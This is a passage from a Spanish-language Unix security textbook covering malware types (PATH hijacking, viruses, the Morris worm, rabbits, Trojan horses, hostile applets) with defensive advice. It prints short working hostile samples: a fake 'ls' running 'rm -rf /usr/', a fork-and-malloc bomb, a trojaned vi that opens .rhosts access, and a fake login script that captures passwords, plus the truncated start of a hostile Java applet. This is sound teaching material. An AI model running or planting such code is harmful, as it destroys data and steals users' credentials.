convertir en un tipo de &#xFB01;chero habitual en Unix (directorio, socket, enlace&#x2026;) con las llamadas
correspondientes.
  </para></section><!--end subsection--></section><!--end section--><!--l. 256--><section 
role="section"><title><abbrev role="title-mark">5.4</abbrev><anchor 
   id="x1-710005.4"  ></anchor>Fauna y otras amenazas</title>
<!--l. 257--><para>  En el punto anterior hemos hablado de problemas de seguridad derivados de errores o descuidos a la hora de
programar; sin embargo, no todas las amenazas l&#x00F3;gicas provienen de simples errores: ciertos programas,
denominados en su conjunto malware o software malicioso, son creados con la intenci&#x00F3;n principal de atacar a la
seguridad <anchor 
   id="x1-71001f3"  ></anchor><footnote><para>     Realmente, algunos de ellos no son necesariamente nocivos; es su uso indebido y no la intenci&#x00F3;n de su programador lo que
los convierte en peligrosos.</para></footnote>.
En esta secci&#x00F3;n vamos a hablar de algunos tipos de malware, sus caracter&#x02CA;&#x0131;sticas y sus efectos
potenciales.
<!--br/-->
<!--br/-->Para prevenir casi todo el software malicioso que pueda afectar a nuestros sistemas es necesaria una buena
concienciaci&#x00F3;n de los usuarios: bajo ning&#x00FA;n concepto han de ejecutar software que no provenga de fuentes
&#xFB01;ables, especialmente programas descargados de p&#x00E1;ginas underground o &#xFB01;cheros enviados a
trav&#x00E9;s de IRC. Evidentemente, esto se ha de aplicar &#x2013; y con m&#x00E1;s rigor &#x2013; al administrador de
la m&#x00E1;quina; si un usuario ejecuta un programa que contiene un virus o un troyano, es casi
imposible que afecte al resto del sistema: en todo caso el propio usuario, o sus &#xFB01;cheros, ser&#x00E1;n los
&#x00FA;nicos perjudicados. Si es el root quien ejecuta el programa contaminado, cualquier archivo
del sistema puede contagiarse &#x2013; virus &#x2013; o las acciones destructivas del malware &#x2013; troyano &#x2013;
afectar&#x00E1;n sin l&#x02CA;&#x0131;mites a todos los recursos del sistema. Aparte de descargar el software de fuentes
&#xFB01;ables, es recomendable utilizar las &#x2018;huellas&#x2019; de todos los programas (generalmente res&#x00FA;menes
MD5 de los &#xFB01;cheros) para veri&#xFB01;car que hemos bajado el archivo leg&#x02CA;&#x0131;timo; tambi&#x00E9;n es preferible
descargar el c&#x00F3;digo fuente y compilar nosotros mismos los programas: aparte de cuestiones de
e&#xFB01;ciencia, siempre tenemos la posibilidad de revisar el c&#x00F3;digo en busca de potenciales problemas de
seguridad.
<!--br/-->
<!--br/-->Otra medida de seguridad muy importante es la correcta asignaci&#x00F3;n de la variable de entorno $PATH,
especialmente para el administrador del sistema. Esta variable est&#x00E1; formada por todos los directorios en los
que el shell buscar&#x00E1; comandos para ejecutarlos; podemos visualizar su contenido mediante la siguiente
orden:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;echo&#x00A0;$PATH
&#x00A0;/sbin:/usr/sbin:/bin:/usr/bin:/usr/local/sbin:/usr/local/sbin:
&#x00A0;/usr/dt/bin:/usr/openwin/bin:/usr/share/texmf/bin
&#x00A0;anita:~#
</literallayout>
<!--l. 297--><para>Cuando un usuario teclea una &#x00F3;rden en la l&#x02CA;&#x0131;nea de comandos, el shell busca en cada uno de estos directorios
un ejecutable con el mismo nombre que el tecleado; si lo encuentra, lo ejecuta sin m&#x00E1;s, y si no lo encuentra
se produce un mensaje de error (el cl&#x00E1;sico &#x2018;command not found&#x2019;). Esta b&#x00FA;squeda se realiza en el orden en que
aparecen los directorios del $PATH: si por ejemplo se hubiera tecleado &#x2018;ls&#x2019;, en nuestro caso se buscar&#x02CA;&#x0131;a
en primer lugar /sbin/ls; como &#x2013; seguramente &#x2013; no existir&#x00E1;, se pasar&#x00E1; al siguiente directorio de la
variable, esto es, se intentar&#x00E1; ejecutar /usr/sbin/ls. Este &#xFB01;chero tampoco ha de existir, por lo
que se intentar&#x00E1; de nuevo con /bin/ls, la ubicaci&#x00F3;n normal del programa, y se ejecutar&#x00E1; este
&#xFB01;chero.
<!--br/-->
<!--br/-->&#x00BF;Qu&#x00E9; problema hay con esta variable? Muy sencillo: para que sea m&#x02CA;&#x0131;nimamente aceptable, ninguno de los
directorios del $PATH ha de poseer permiso de escritura para los usuarios normales; esto incluye
evidentemente directorios como /tmp/, pero tambi&#x00E9;n otro que a primera vista puede no tener mucho
sentido: el directorio actual, &#x2018;.&#x2019;. Imaginemos la siguiente situaci&#x00F3;n: el root de un sistema Unix tiene
incluido en su variable $PATH el directorio actual como uno m&#x00E1;s donde buscar ejecutables; esto es algo
muy habitual por cuestiones de comodidad. Por ejemplo, la variable de entorno puede tener el siguiente
contenido:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;echo&#x00A0;$PATH
&#x00A0;.:/sbin:/usr/sbin:/bin:/usr/bin:/usr/local/sbin:/usr/local/sbin:
&#x00A0;/usr/dt/bin:/usr/openwin/bin:/usr/share/texmf/bin
&#x00A0;anita:~#
</literallayout>
<!--l. 325--><para>Si este administrador desea comprobar el contenido del directorio /tmp/, o el de $HOME de alguno de sus
usuarios (recordemos, directorios donde pueden escribir), seguramente ir&#x00E1; a dicho directorio y ejecutar&#x00E1; un
simple ls. Pero, &#x00BF;qu&#x00E9; sucede si el &#x2018;.&#x2019; est&#x00E1; en primer lugar en la variable $PATH? El shell buscar&#x00E1; en primer
lugar en el directorio actual, por ejemplo /tmp/, de forma que si ah&#x02CA;&#x0131; existe un ejecutable denominado
&#x2018;ls&#x2019;, se ejecutar&#x00E1; sin m&#x00E1;s: teniendo en cuenta que cualquiera puede escribir en el directorio, ese programa
puede tener el siguiente contenido:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;cat&#x00A0;/tmp/ls
&#x00A0;#!/bin/sh
&#x00A0;rm&#x00A0;-rf&#x00A0;/usr/&#x00A0;&#x0026;
&#x00A0;anita:~#
</literallayout>
<!--l. 342--><para>Como podemos ver, un inocente &#x2018;ls&#x2019; puede destruir parte del sistema de &#xFB01;cheros &#x2013; o todo &#x2013;, simplemente
porque el administrador no ha tenido la precauci&#x00F3;n de eliminar de su $PATH directorios donde los usuarios
puedan escribir.
<!--br/-->
<!--br/-->Seguramente alguien encontrar&#x00E1; una soluci&#x00F3;n &#x2013; falsa &#x2013; a este problema: si la cuesti&#x00F3;n reside en el
orden de b&#x00FA;squeda, &#x00BF;por qu&#x00E9; no poner el directorio actual al &#xFB01;nal del $PATH, depu&#x00E9;s de todos los
directorios &#xFB01;ables? De esta forma, el programa ./ls no se ejecutar&#x00E1; nunca, ya que antes el shell va a
encontrar con toda seguridad al programa leg&#x02CA;&#x0131;timo, /bin/ls. Evidentemente esto es as&#x02CA;&#x0131;, pero es
f&#x00E1;cil comprobar que el problema persiste: imaginemos que estamos en esa situaci&#x00F3;n, y ahora
tecleamos en /tmp/ la orden ls<informalequation><graphic 
fileref="unixsec50x.gif"></graphic></informalequation>more. No ocurrir&#x00E1; nada anormal, ya que tanto &#x2018;ls&#x2019; como
&#x2018;more&#x2019; son programas que el shell ejecutar&#x00E1; antes de analizar &#x2018;.&#x2019;. Pero, &#x00BF;qu&#x00E9; pasar&#x02CA;&#x0131;a si nos
equivocamos al teclear, y en lugar de &#x2018;more&#x2019; escribimos &#x2018;moer&#x2019;? Al &#xFB01;n y al cabo, no es un
ejemplo tan rebuscado, esto seguramente le ha pasado a cualquier usuario de Unix; si esto
ocurre as&#x02CA;&#x0131;, el int&#x00E9;rprete de &#x00F3;rdenes no encontrar&#x00E1; ning&#x00FA;n programa que se llame &#x2018;moer&#x2019; en el
$PATH, por lo que se generar&#x00E1; un mensaje de error&#x2026;&#x00BF;Ninguno? &#x00BF;Y si un usuario ha creado
/tmp/moer, con un contenido similar al /tmp/ls anterior? De nuevo nos encontramos ante el mismo
problema: una orden tan inocente como esta puede afectar gravemente a la integridad de
nuestras m&#x00E1;quinas. Visto esto, parece claro que bajo ning&#x00FA;n concepto se ha de tener un directorio
en el que los usuarios puedan escribir, ni siquiera el directorio actual (&#x2018;.&#x2019;) en la variable
$PATH.
  </para><!--l. 367--><section 
role="subsection"><title><abbrev role="title-mark">5.4.1</abbrev><anchor 
   id="x1-720005.4.1"  ></anchor>Virus</title>
<!--l. 368--><para>  Un virus es una secuencia de c&#x00F3;digo que se inserta en un &#xFB01;chero ejecutable denominado host, de forma
que al ejecutar el programa tambi&#x00E9;n se ejecuta el virus; generalmente esta ejecuci&#x00F3;n implica la copia del
c&#x00F3;digo viral &#x2013; o una modi&#xFB01;caci&#x00F3;n del mismo &#x2013; en otros programas. El virus necesita obligatoriamente un
programa donde insertarse para poderse ejecutar, por lo que no se puede considerar un programa o
proceso independiente.
<!--br/-->
<!--br/-->Durante a~nos, un debate t&#x02CA;&#x0131;pico entre la comunidad de la seguridad inform&#x00E1;tica es la existencia de virus en
Unix (<citation>[?]</citation>, <citation>[?]</citation>, <citation>[?]</citation>&#x2026;). &#x00BF;Existen virus en este entorno, o por el contrario son un producto de otros sistemas
en los que el concepto de seguridad se pierde? Realmente existen virus sobre plataformas
Unix capaces de reproducirse e infectar &#xFB01;cheros, tanto ELF como shellscripts: ya en 1983
Fred Cohen dise~n&#x00F3; un virus que se ejecutaba con &#x00E9;xito sobre Unix en una VAX 11&#x2013;750 (<citation>[?]</citation>);
a~nos m&#x00E1;s tarde, en art&#x02CA;&#x0131;culos como <citation>[?]</citation> o <citation>[?]</citation> se ha mostrado incluso el c&#x00F3;digo necesario para la
infecci&#x00F3;n.
<!--br/-->
<!--br/-->Parece claro que la existencia de virus en Unix es algo sobradamente comprobado; entonces, &#x00BF;d&#x00F3;nde est&#x00E1; el
debate? La discusi&#x00F3;n se centra en hasta qu&#x00E9; punto un virus para Unix puede comprometer la seguridad del
sistema; generalmente, la existencia de estos virus y sus efectos no suelen ser muy perjudiciales en los
sistemas Unix de hoy en d&#x02CA;&#x0131;a. Se suele tratar de c&#x00F3;digo escrito &#x00FA;nicamente como curiosidad cient&#x02CA;&#x0131;&#xFB01;ca, ya que
cualquier acci&#x00F3;n que realice un virus es en general m&#x00E1;s f&#x00E1;cilmente realizable por otros medios como un simple
exploit; de hecho, uno de los primeros virus para Unix (en t&#x00E9;rminos puristas se podr&#x02CA;&#x0131;a considerar un
troyano m&#x00E1;s que un virus) fu&#x00E9; creado por uno de los propios dise~nadores del sistema operativo, Ken
Thompson (<citation>[?]</citation>), con el &#xFB01;n no de da~nar al sistema, sino de mostrar hasta qu&#x00E9; punto se puede con&#xFB01;ar en el
software de una m&#x00E1;quina.

  </para></section><!--end subsection--><!--l. 398--><section 
role="subsection"><title><abbrev role="title-mark">5.4.2</abbrev><anchor 
   id="x1-730005.4.2"  ></anchor>Gusanos</title>
<!--l. 399--><para>  El t&#x00E9;rmino gusano, acu~nado en 1975 en la obra de ciencia &#xFB01;cci&#x00F3;n de John Brunner The Shockwave Rider
hace referencia a programas capaces de viajar por s&#x02CA;&#x0131; mismos a trav&#x00E9;s de redes de computadores para
realizar cualquier actividad una vez alcanzada una m&#x00E1;quina; aunque esta actividad no tiene por qu&#x00E9; entra~nar
peligro, los gusanos pueden instalar en el sistema alcanzado un virus, atacar a este sistema como har&#x02CA;&#x0131;a un
intruso, o simplemente consumir excesivas cantidades de ancho de banda en la red afectada. Aunque se
trata de malware much&#x02CA;&#x0131;simo menos habitual que por ejemplo los virus o las puertas traseras, ya que
escribir un gusano peligroso es una tarea muy dif&#x02CA;&#x0131;cil, los gusanos son una de las amenazas
que potencialmente puede causar mayores da~nos: no debemos olvidar que el mayor incidente
de seguridad de la historia de Unix e Internet fu&#x00E9; a causa de un gusano (el famoso Worm de
1988).
<!--br/-->
<!--br/-->Antes del Worm de Robert T. Morris existieron otros gusanos con &#xFB01;nes muy diferentes; a principios de los
setenta Bob Thomas escribi&#x00F3; lo que muchos consideran el primer gusano inform&#x00E1;tico. Este programa,
denominado &#x2018;creeper&#x2019;, no era ni mucho menos malware, sino que era utilizado en los aeropuertos por los
controladores a&#x00E9;reos para noti&#xFB01;car que el control de determinado avi&#x00F3;n hab&#x02CA;&#x0131;a pasado de un ordenador a otro.
Otros ejemplos de gusanos &#x00FA;tiles fueron los desarrollados a principios de los ochenta por John Shoch y Jon
Hupp, del centro de investigaci&#x00F3;n de Xerox en Palo Alto, California; estos worms se dedicaron a tareas
como el intercambio de mensajes entre sistemas o el aprovechamiento de recursos ociosos durante la noche
(<citation>[?]</citation>). Todo funcionaba aparentemente bien, hasta que una ma~nana al llegar al centro ning&#x00FA;n ordenador
funcion&#x00F3; debido a un error en uno de los gusanos; al reiniciar los sistemas, inmediatamente
volvieron a fallar porque el gusano segu&#x02CA;&#x0131;a trabajando, por lo que fu&#x00E9; necesario dise~nar una
vacuna. Este es considerado el primer incidente de seguridad en el que entraban worms en
juego.
<!--br/-->
<!--br/-->Sin embargo, no fu&#x00E9; hasta 1988 cuando se produjo el primer incidente de seguridad &#x2018;serio&#x2019; provocado por un
gusano, que a la larga se ha convertido en el primer problema de seguridad inform&#x00E1;tica que salt&#x00F3; a los
medios (<citation>[?]</citation>, <citation>[?]</citation>, <citation>[?]</citation>&#x2026;) y tambi&#x00E9;n en el m&#x00E1;s grave &#x2013; civil, al menos &#x2013; de todos los tiempos. El 2
de noviembre de ese a~no, Robert T. Morris salt&#x00F3; a la fama cuando uno de sus programas se
convirti&#x00F3; en &#x2018;el Gusano&#x2019; con may&#x00FA;sculas, en el Worm de Internet. La principal causa del problema
fu&#x00E9; la &#xFB01;losof&#x02CA;&#x0131;a &#x2018;Security through Obscurity&#x2019; que muchos a&#x00FA;n de&#xFB01;enden hoy en d&#x02CA;&#x0131;a: este joven
estudiante era hijo del prestigioso cient&#x02CA;&#x0131;&#xFB01;co Robert Morris, experto en Unix y seguridad &#x2013;
entre otros lugares, ha trabajado por ejemplo para el National Computer Security Center
estadounidense &#x2013;, quien conoc&#x02CA;&#x0131;a perfectamente uno de los muchos fallos en Sendmail. No hizo
p&#x00FA;blico este fallo ni su soluci&#x00F3;n, y su hijo aprovech&#x00F3; ese conocimiento para incorporarlo a su
gusano (se puede leer parte de esta fascinante historia en <citation>[?]</citation>). El Worm aprovechaba varias
vulnerabilidades en programas como sendmail, fingerd, rsh y rexecd (<citation>[?]</citation>) para acceder a un
sistema, contaminarlo, y desde &#x00E9;l seguir actuando hacia otras m&#x00E1;quinas (en <citation>[?]</citation>, <citation>[?]</citation> o <citation>[?]</citation> se pueden
encontrar detalles concretos del funcionamiento de este gusano). En unas horas, miles de equipos
conectados a la red dejaron de funcionar (<citation>[?]</citation>), todos presentando una sobrecarga de procesos sh
(el nombre camu&#xFB02;ado del gusano en los sistemas Unix); reiniciar el sistema no era ninguna
soluci&#x00F3;n, porque tras unos minutos de funcionamiento el sistema volv&#x02CA;&#x0131;a a presentar el mismo
problema.
<!--br/-->
<!--br/-->Fueron necesarias muchas horas de trabajo para poder detener el Worm de Robert T. Morris; expertos de
dos grandes universidades norteamericanas, el MIT y Berkeley, fueron capaces de desensamblar el c&#x00F3;digo y
proporcionar una soluci&#x00F3;n al problema. Junto a ellos, cientos de administradores y programadores de todo
el mundo colaboraron ininterrumpidamente durante varios d&#x02CA;&#x0131;as para analizar c&#x00F3;mo se hab&#x02CA;&#x0131;an contaminado
y cu&#x00E1;les eran los efectos que el gusano hab&#x02CA;&#x0131;a causado en sus sistemas. El d&#x02CA;&#x0131;a 8 de noviembre, casi una
semana despu&#x00E9;s del ataque, expertos en seguridad de casi todos los &#x00E1;mbitos de la vida estadounidense se
reunieron para aclarar qu&#x00E9; es lo que pas&#x00F3; exactamente, c&#x00F3;mo se hab&#x02CA;&#x0131;a resuelto, cu&#x00E1;les eran las
consecuencias y c&#x00F3;mo se pod&#x02CA;&#x0131;a evitar que sucediera algo parecido en el futuro; all&#x02CA;&#x0131; hab&#x02CA;&#x0131;a desde
investigadores del MIT o Berkeley hasta miembros de la CIA, el Departamento de Energ&#x02CA;&#x0131;a o
el Laboratorio de Investigaci&#x00F3;n Bal&#x02CA;&#x0131;stica, pasando por supuesto por miembros del National
Computer Security Center, organizador del evento. Esta reuni&#x00F3;n, y el incidente en s&#x02CA;&#x0131;, marcaron
un antes y un despu&#x00E9;s en la historia de la seguridad inform&#x00E1;tica; la sociedad en general y los

investigadores en particular tomaron conciencia del grave problema que supon&#x02CA;&#x0131;a un ataque
de esa envergadura, y a partir de ah&#x02CA;&#x0131; comenzaron a surgir organizaciones como el CERT,
encargadas de velar por la seguridad de los sistemas inform&#x00E1;ticos. Tambi&#x00E9;n se determinaron medidas
de prevenci&#x00F3;n que siguen vigentes hoy en d&#x02CA;&#x0131;a, de forma que otros ataques de gusanos no han
sido tan espectaculares: a &#xFB01;nales de 1989 un gusano llamado wank, que a diferencia del de
Morris era destructivo, no tuvo ni de lejos las repercusiones que &#x00E9;ste. Desde entonces, no ha
habido ninguna noticia importante &#x2013; al menos publicada por el CERT &#x2013; de gusanos en entornos
Unix.
  </para></section><!--end subsection--><!--l. 481--><section 
role="subsection"><title><abbrev role="title-mark">5.4.3</abbrev><anchor 
   id="x1-740005.4.3"  ></anchor>Conejos</title>
<!--l. 482--><para>  Los conejos o bacterias son programas que de forma directa no da~nan al sistema, sino que se limitan a
reproducirse, generalmente de forma exponencial, hasta que la cantidad de recursos consumidos
(procesador, memoria, disco&#x2026;) se convierte en una negaci&#x00F3;n de servicio para el sistema afectado. Por
ejemplo, imaginemos una m&#x00E1;quina Unix sin una quota de procesos establecida; cualquier usuario podr&#x02CA;&#x0131;a
ejecutar un c&#x00F3;digo como el siguiente:

     </para><literallayout role="verbatim">
&#x00A0;main(){
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;while(1){
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;malloc(1024);
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;fork();
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;}
&#x00A0;}
</literallayout>
<!--l. 501--><para>Este programa reservar&#x02CA;&#x0131;a un kilobyte de memoria y a continuaci&#x00F3;n crear&#x02CA;&#x0131;a una copia de &#x00E9;l mismo; el programa
original y la copia repetir&#x02CA;&#x0131;an estas acciones, generando cuatro copias en memoria que volver&#x02CA;&#x0131;an a hacer lo
mismo. As&#x02CA;&#x0131;, tras un intervalo de ejecuci&#x00F3;n, el c&#x00F3;digo anterior consumir&#x02CA;&#x0131;a toda la memoria del sistema,
pudiendo provocar incluso su parada.
<!--br/-->
<!--br/-->La mejor forma de prevenir ataques de conejos (o simples errores en los programas, que hagan que &#x00E9;stos
consuman excesivos recursos) es utilizar las facilidades que los n&#x00FA;cleos de cualquier Unix moderno ofrecen
para limitar los recursos que un determinado proceso o usuario puede llegar a consumir en nuestro
sistema; en la secci&#x00F3;n tres se repasan algunos de los par&#x00E1;metros necesarios para realizar esta tarea sobre
diversos clones del sistema Unix.
  </para></section><!--end subsection--><!--l. 514--><section 
role="subsection"><title><abbrev role="title-mark">5.4.4</abbrev><anchor 
   id="x1-750005.4.4"  ></anchor>Caballos de Troya</title>
<!--l. 515--><para>  En el libro VIII de La Odisea de Homero se cuenta la historia de que los griegos, tras mucho tiempo de
asedio a la ciudad de Troya, decidieron construir un gran caballo de madera en cuyo interior se
escondieron unos cuantos soldados; el resto del ej&#x00E9;rcito griego abandon&#x00F3; el asedio dejando all&#x02CA;&#x0131; el caballo, y al
darse cuenta de que el sitio a su ciudad hab&#x02CA;&#x0131;a acabado, los troyanos salieron a inspeccionar ese gran
caballo de madera. Lo tomaron como una muestra de su victoria y lo introdujeron tras las murallas de la
ciudad sin darse cuenta de lo que realmente hab&#x02CA;&#x0131;a en &#x00E9;l. Cuando los troyanos estaban celebrando el &#xFB01;n del
asedio, del interior del caballo salieron los soldados griegos, que abrieron las puertas de la ciudad al resto
de su ej&#x00E9;rcito &#x2013; que hab&#x02CA;&#x0131;a vuelto al lugar &#x2013; y pudieron de esta forma conquistar la ciudad de
Troya.
<!--br/-->
<!--br/-->De la misma forma que el antiguo caballo de Troya de la mitolog&#x02CA;&#x0131;a griega escond&#x02CA;&#x0131;a en su interior algo que
los troyanos desconoc&#x02CA;&#x0131;an, y que ten&#x02CA;&#x0131;a una funci&#x00F3;n muy diferente a la que ellos pensaban, un troyano o
caballo de Troya actual es un programa que aparentemente realiza una funci&#x00F3;n &#x00FA;til para qui&#x00E9;n
lo ejecuta, pero que en realidad &#x2013; o aparte &#x2013; realiza una funci&#x00F3;n que el usuario desconoce,
generalmente da~nina. Por ejemplo, un usuario que posea el su&#xFB01;ciente privilegio en el sistema
puede renombrar el editor vi como vi.old, y crear un programa denominado vi como el
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;#!/bin/sh
&#x00A0;echo&#x00A0;&#x0022;++&#x0022;&#x003E;$HOME/.rhosts
&#x00A0;vi.old&#x00A0;$1
</literallayout>
<!--l. 545--><para>Si esto sucede, cuando alguien trate de editar un &#xFB01;chero autom&#x00E1;ticamente va a crear un &#xFB01;chero .rhosts en su
directorio de usuario, que permitir&#x00E1; a un atacante acceder de una forma sencilla al sistema utilizando las
&#x00F3;rdenes r-<informalequation><graphic 
fileref="unixsec51x.gif"></graphic></informalequation> de Unix BSD.
<!--br/-->
<!--br/-->Los troyanos son quiz&#x00E1;s el malware m&#x00E1;s difundido en cualquier tipo de entorno (<citation>[?]</citation>), incluyendo por
supuesto a Unix; sus variantes incluyen incluso ejemplos graciosos: ha habido casos en los que comenta un
potencial problema de seguridad &#x2013; real &#x2013; en una lista de correo y se acompa~na la descripci&#x00F3;n
de un shellscript que en principio aprovecha dicho problema para conseguir privilegios de
root. En ese exploit se ha incluido, convenientemente camu&#xFB02;ada, una sentencia similar a la
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;echo&#x00A0;&#x0022;A&#x2019;p&#x00A0;gr4ibf&#x00A0;t2&#x00A0;hLcM&#x00A0;ueem&#x0022;|tr&#x00A0;Ae4Lpbf2gumM&#x00A0;Ioyamngotrtk|&#x00A0;mail&#x00A0;&#x005C;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;-s&#x00A0;&#x0022;&#x2018;echo&#x00A0;&#x0022;A&#x2019;p&#x00A0;gr4ibf&#x00A0;t2&#x00A0;hLcM&#x00A0;ueem&#x0022;|tr&#x00A0;Ae4Lpbf2gumM&#x00A0;Ioyamngotrtk&#x2018;&#x0022;&#x00A0;root
</literallayout>
<!--l. 563--><para>De esta forma, cuando un script kiddie ejecute el programa para conseguir privilegios en el sistema, sin darse
cuenta autom&#x00E1;ticamente lo estar&#x00E1; noti&#xFB01;cando al administrador del mismo; evidentemente el exploit suele ser
falso y no da ning&#x00FA;n privilegio adicional, simplemente sirve para que el root sepa qu&#x00E9; usuarios est&#x00E1;n &#x2018;jugando&#x2019;
con la seguridad de sus m&#x00E1;quinas.
<!--br/-->
<!--br/-->Por desgracia, estos troyanos inofensivos no son los m&#x00E1;s comunes; existen tambi&#x00E9;n ejemplos de caballos de
Troya da~ninos: sin duda el ejemplo t&#x02CA;&#x0131;pico de troyano (tan t&#x02CA;&#x0131;pico que ha recibido un nombre especial: trojan
mule o mula de Troya (<citation>[?]</citation>)) es el falso programa de login. Nada m&#x00E1;s encender una terminal de una m&#x00E1;quina
Unix aparece el cl&#x00E1;sico mensaje &#x2018;login:&#x2019; solicitando nuestro nombre de usuario y contrase~na, datos que
con toda seguridad la persona que enciende este dispositivo teclear&#x00E1; para poder acceder al
sistema. Pero, &#x00BF;qu&#x00E9; suceder&#x02CA;&#x0131;a si el programa que imprime el mensaje en pantalla es un troyano?
Cualquier usuario del sistema puede crear un c&#x00F3;digo que muestre un mensaje similar, guarde
la informaci&#x00F3;n le&#x02CA;&#x0131;da de teclado (el login y el password) e invoque despu&#x00E9;s al programa login
original; tras la primera lectura, se mostrar&#x00E1; el tambi&#x00E9;n cl&#x00E1;sico mensaje &#x2018;Login incorrect&#x2019;, de
forma que el usuario pensar&#x00E1; que ha tecleado mal sus datos &#x2013; nada extra~no, al &#xFB01;n y al cabo &#x2013;.
Cuando el programa original se ejecute, se permitir&#x00E1; el acceso al sistema y ese usuario no habr&#x00E1;
notado nada anormal, pero alguien acaba de registrar su login y su contrase~na. Un troyano de
este tipo es tan sencillo que se puede hacer &#x2013; de forma simpli&#xFB01;cada &#x2013; en unas pocas l&#x02CA;&#x0131;neas de
shellscript:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~$&#x00A0;cat&#x00A0;trojan
&#x00A0;clear
&#x00A0;printf&#x00A0;&#x0022;&#x2018;uname&#x00A0;-n&#x2018;&#x00A0;login:&#x00A0;&#x0022;
&#x00A0;read&#x00A0;login
&#x00A0;stty&#x00A0;-echonl&#x00A0;-echo
&#x00A0;printf&#x00A0;&#x0022;Password:&#x00A0;&#x0022;
&#x00A0;read&#x00A0;pass
&#x00A0;echo&#x00A0;&#x0022;$login&#x00A0;:&#x00A0;$pass&#x0022;&#x00A0;&#x003E;&#x003E;/tmp/.claves
&#x00A0;printf&#x00A0;&#x0022;&#x005C;nLogin&#x00A0;incorrect&#x0022;
&#x00A0;echo
&#x00A0;exec&#x00A0;/bin/login
&#x00A0;luisa:~$
</literallayout>
<!--l. 605--><para>El atacante no necesita m&#x00E1;s que dejar lanzado el programa en varias terminales del sistema y esperar
tranquilamente a que los usuarios vayan tecleando sus logins y passwords, que se guardar&#x00E1;n en
/tmp/.claves; evidentemente este ejemplo de troyano es muy simple, pero es su&#xFB01;ciente para hacernos una
idea del perjuicio que estos programas pueden producir en una m&#x00E1;quina Unix. En los &#x00FA;ltimos a~nos han
aparecido caballos de Troya mucho m&#x00E1;s elaborados en diversas utilidades de Unix, incluso en aplicaciones
relacionadas con la seguridad como TCP Wrappers; en <citation>[?]</citation> se pueden encontrar referencias a algunos de
ellos.
<!--br/-->
<!--br/-->La forma m&#x00E1;s f&#x00E1;cil de descubrir caballos de Troya (aparte de sufrir sus efectos una vez activado) es comparar
los &#xFB01;cheros bajo sospecha con una copia de los originales, copia que evidentemente se ha de haber
efectuado antes de poner el sistema en funcionamiento y debe haber sido guardada en un lugar seguro,
para evitar as&#x02CA;&#x0131; que el atacante modi&#xFB01;que tambi&#x00E9;n la versi&#x00F3;n de nuestro backup. Tambi&#x00E9;n es recomendable &#x2013;
como sucede con el resto de malware &#x2013; realizar res&#x00FA;menes MD5 de nuestros programas y compararlos con los
res&#x00FA;menes originales; esto, que muchas veces es ignorado, puede ser una excelente soluci&#x00F3;n para prevenir la
amenaza de los caballos de Troya.
  </para></section><!--end subsection--><!--l. 624--><section 
role="subsection"><title><abbrev role="title-mark">5.4.5</abbrev><anchor 
   id="x1-760005.4.5"  ></anchor>Applets hostiles</title>
<!--l. 625--><para>  En los &#x00FA;ltimos a~nos, con la proliferaci&#x00F3;n de la web, Java y Javascript, una nueva forma de malware se ha
hecho popular. Se trata de los denominados applets hostiles, applets que al ser descargados intentan
monopolizar o explotar los recursos del sistema de una forma inapropiada (<citation>[?]</citation>); esto incluye desde ataques
cl&#x00E1;sicos como negaciones de servicio o ejecuci&#x00F3;n remota de programas en la m&#x00E1;quina cliente hasta amenazas
mucho m&#x00E1;s elaboradas, como difusi&#x00F3;n de virus, ruptura l&#x00F3;gica de cortafuegos o utilizaci&#x00F3;n de recursos remotos
para grandes c&#x00E1;lculos cient&#x02CA;&#x0131;&#xFB01;cos.
<!--br/-->
<!--br/-->Como ejemplo de applet hostil &#x2013; aunque este en concreto no es muy peligroso &#x2013; tenemos el siguiente c&#x00F3;digo,
obra de Mark D. LaDue (1996):

     </para><literallayout role="verbatim">
&#x00A0;anita:~/Security#&#x00A0;cat&#x00A0;Homer.java
&#x00A0;import&#x00A0;java.io.*;
&#x00A0;
&#x00A0;class&#x00A0;Homer&#x00A0;{
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;public&#x00A0;static&#x00A0;void&#x00A0;main&#x00A0;(String[]&#x00A0;argv)&#x00A0;{
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;try&#x00A0;{
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;String&#x00A0;userHome&#x00A0;=&#x00A0;System.getProperty(&#x0022;user.home&#x0022;);
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;String&#x00A0;target&#x00A0;=&#x00A0;&#x0022;$HOME&#x0022;;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;FileOutputStream&#x00A0;outer&#x00A0;=&#x00A0;new
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;FileOutputStream(userHome&#x00A0;+&#x00A0;&#x0022;/.homer.sh&#x0022;);
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;String&#x00A0;homer&#x00A0;=&#x00A0;&#x0022;#!/bin/sh&#x0022;&#x00A0;+&#x00A0;&#x0022;&#x005C;n&#x0022;&#x00A0;+&#x00A0;&#x0022;#-&#x005F;&#x0022;&#x00A0;+&#x00A0;&#x0022;&#x005C;n&#x0022;&#x00A0;+
